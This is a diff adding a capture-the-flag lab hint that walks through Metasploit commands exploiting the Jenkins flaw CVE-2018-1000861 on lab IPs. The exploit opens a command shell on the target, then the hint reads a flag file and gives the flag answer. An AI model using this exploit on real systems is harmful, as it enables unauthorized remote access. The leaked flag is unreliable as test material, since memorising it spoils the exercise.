@@ -1,0 +1,40 @@
+HINT -- phase 3 (msfconsole)
+══════════════════════════════════════════════════════════════════
+
+THE FULL METASPLOIT WALK
+────────────────────────
+Open metasploit:
+
+    msfconsole
+
+Then type these inside the msf6 prompt, one at a time:
+
+    search CVE-2018-1000861
+    use 0
+    set RHOSTS 10.4.12.1
+    set LHOST 10.4.12.99
+    check
+    exploit
+
+WHAT HAPPENS WHEN EXPLOIT FIRES
+───────────────────────────────
+You'll see "Command shell session 1 opened" and the prompt goes
+blank. You're on the Jenkins box now -- typing commands AS the
+jenkins user. Read the blueprint:
+
+    cat /var/m0use/blueprint.txt
+
+The flag is on the line that starts with "Flag:". Copy the value
+from inside m0use{...}.
+
+GETTING BACK OUT
+────────────────
+To leave the shell session:   exit
+To leave msfconsole:          exit
+
+HOW TO SUBMIT
+─────────────
+Type the flag value at the m0usenet prompt (no m0use{...} wrap, no
+keyword):
+
+    jenkins_was_a_mistake
